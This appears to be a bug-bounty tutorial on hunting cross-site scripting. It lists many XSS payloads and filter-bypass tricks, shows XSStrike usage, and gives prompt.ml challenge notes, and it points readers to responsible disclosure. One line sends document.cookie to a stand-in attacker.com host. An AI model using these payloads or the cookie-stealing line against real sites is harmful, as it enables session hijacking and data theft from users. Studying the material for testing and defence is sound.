# What is XSS (Cross-Site Scripting)? 🤔

```
  - It allows attackers to inject malicious scripts into websites.
  - These scripts then run in the browser of other users who visit that website.
  - The attacker can steal information, manipulate the website’s content, or even take control of a user’s session.
  - Medium Risk ( low impact + high probability = medium risk )
```

# 🎯 Why is XSS Dangerous?
```
 - Steal cookies and session tokens (can take over user accounts). / Keylogging
 - Redirect users to malicious websites. / Phishing / URL Redirection
 - Modify the website’s content.
 - Spread malware.
```


# 📋 Types of XSS:
```
Stored XSS (Persistent):
	- Malicious code is saved on the website’s server (e.g., in comments or profiles).
	- Example: An attacker writes harmful JavaScript in a comment box, and every visitor sees the harmful script.

Reflected XSS:
    - The malicious script is included in a URL or form input.
    - Example: An attacker sends a link with malicious code, and if the victim clicks it, the script runs.

DOM-based XSS:
    - Happens when the client-side script processes untrusted data.
    - Example: A website’s JavaScript dynamically updates the page using URL parameters without validation.
```

# 🔎 How to Hunt for XSS (Cross-Site Scripting)?

## 🛠 Steps to Hunt for XSS:

### 📌 Step 1: Identify User Input Fields
```
Look for places where a website accepts user input and displays it back. These can include:
    - Search boxes
    - Comment sections
    - Login forms
    - URL parameters (GET requests)
    - Cookies and headers
    - File upload functionality
```

### 📌 Step 2: Test for Reflected XSS (Quick Wins)
## Reflected XSS occurs when a script is injected into a URL or input field and gets reflected back immediately.

### ✅ Payloads to Try:
#####  Basic Payloads:
```
<script>alert('XSS');</script>
```

```
<img src=x onerror=alert('XSS')>
```
```
<svg onload=alert('XSS')>
```

### 2. In URL Parameters:
````
Try injecting payloads into URL parameters.

Example:
   php
       - https://example.com/search?query=<script>alert('XSS')</script>
````

### 3.In Input Fields:
```
Enter the payload in form fields, such as a login form, search box, or feedback form.
```

### 📌 Step 3: Test for Stored XSS (Persistent XSS)
## Stored XSS occurs when your malicious input is saved on the server and shown to other users.

### ✅ Places to Check:
```
 - Comment sections
 - Profile fields
 - Message boards
 - File uploads (malicious scripts inside files)
```

### 🚩 Steps:
```
Post a comment like this: <script>alert('Stored XSS');</script> 
  - Refresh the page and see if the script runs for you or other users. 
```


### 📌 Step 4: Test for DOM-Based XSS

## DOM-based XSS happens when the website’s JavaScript manipulates the DOM using user input without proper validation.

### ✅ Payloads to Try:
```
Enter this in the URL:
  https://example.com/#<script>alert('DOM XSS');</script>
  Or test in the input fields:  <input type="text" onfocus="alert('XSS')">
```
### 🚩 Look for JavaScript Functions
```
Check if the website uses functions like innerHTML, document.write(), or eval().
```



### 📌 Step 5: Use XSS Payloads Lists
## Use pre-built XSS payload lists to try various injections.
### 🔗 Payloads All The Things (GitHub):

```
 https://github.com/swisskyrepo/PayloadsAllTheThings
```

### 📌 Step 6: Use XSS Hunting Tools
#### 🧰 1. Burp Suite (Most Popular)
```
Intercept requests and modify user input to inject XSS payloads.
Use Burp Scanner to automate XSS checks.
```
#### 🧰 2. OWASP ZAP (Free and Open Source)
```
Automated scanner for finding XSS and other vulnerabilities.
```
#### 🧰 3. XSStrike
```
A dedicated XSS tool that intelligently finds and exploits XSS vulnerabilities.
   - git clone https://github.com/s0md3v/XSStrike
   - python3 xsstrike.py -u https://example.com
```
#### 🧰 4. XSS Hunter (Advanced)
```
   - Use XSS Hunter to find blind XSS vulnerabilities.
   - It provides a custom tracking domain to catch XSS that doesn't show immediate output.
```
### 📌 Step 7: Bypass Filters (WAF/Firewalls)
```
Some websites may block basic payloads. Try bypass techniques:
 - Bypass Tags:
        <<script>alert('XSS');</script>
 - Using Unicode Encoding:
        <scrİpt>alert('XSS')</scrİpt>
 - Using Obfuscation:
        <img src=x onerror='javasc'+'ript:alert("XSS")'>
 - Using Event Handlers:
        <input type="text" onfocus="alert('XSS')">
 ```
### 📌 Step 8: Report XSS Vulnerabilities
```
If you find an XSS vulnerability, report it responsibly to the website owner or use bug bounty platforms like:
HackerOne (https://hackerone.com)
Bugcrowd (https://bugcrowd.com)
Intigriti (https://www.intigriti.com)
```
## 🚩 Signs of a Successful XSS:
```
You see an alert box.
You can steal cookies using:
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
### Payload
```
alert(document.domain);
"><script>alert(1)</script>
"/> <script>alert("XSS")</script>
```


### Payload
```
<script>alert('xss')</scripts>
');" /><script>alert('xss')</scripts>

```
<hr>

## Challenge
```
keyboard input will become a string response you can try to give input through mouse 
	onmouseover=alert(1);
	'onmouseover='alert(1);
if your input correctly placed outside of any html tag then js will execute there 
	"onmouseover="alert(1);
```
### http://prompt.ml/0
```
** If tags stripping mechanism remove open & close tag i.e. <script> --> use <svg/onload=alert(1);

** whenever your input reflect as a plain text you should use svg vector 

If input.replace(/[=(]/g, '');  --> encode it;<script>alert&#40;1)</script>
( -> &#40; it means round bacess



```


# Deep into XSS payload bypass techniques and handling input sanitization mechanisms. 

### 1️⃣ When Tags Are Stripped: Use Non-Script Elements (e.g., <svg>)
```
If the web application strips traditional <script> tags, you can use non-script tags that support event handlers (like onload):
<svg/onload=alert(1)>
The <svg> element is often allowed by filters because it's a vector graphic element.
The onload event executes JavaScript when the SVG is loaded.
```

